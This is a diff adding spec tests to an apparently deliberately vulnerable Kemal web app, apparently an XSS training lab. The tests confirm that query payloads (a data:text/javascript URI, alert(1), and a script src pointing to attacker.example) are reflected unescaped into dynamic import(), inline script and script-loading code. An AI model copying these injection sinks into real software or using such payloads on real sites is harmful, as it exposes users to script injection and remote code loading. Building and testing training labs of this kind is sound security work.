@@ -159,4 +159,26 @@ describe "Kemal routing integration" do
     response.body.should contain("location.hash.slice(1)")
     response.body.should contain("$(target).appendTo")
   end
+
+  it "serves codeexec level2 and reflects the specifier into a dynamic import()" do
+    payload = "data:text/javascript,alert(1)"
+    get "/codeexec/level2/?query=#{URI.encode_www_form(payload)}"
+    response.status_code.should eq 200
+    response.body.should contain("import('#{payload}')")
+  end
+
+  it "serves codeexec level4 and reflects the snippet into an inline script body" do
+    payload = "alert(1)"
+    get "/codeexec/level4/?query=#{URI.encode_www_form(payload)}"
+    response.status_code.should eq 200
+    response.body.should contain("var snippet = '#{payload}';")
+    response.body.should contain("s.text = snippet;")
+  end
+
+  it "serves codeexec level6 and reflects the value into a dynamic script src" do
+    payload = "//attacker.example/x.js"
+    get "/codeexec/level6/?query=#{URI.encode_www_form(payload)}"
+    response.status_code.should eq 200
+    response.body.should contain("var src = '#{payload}';")
+  end
 end
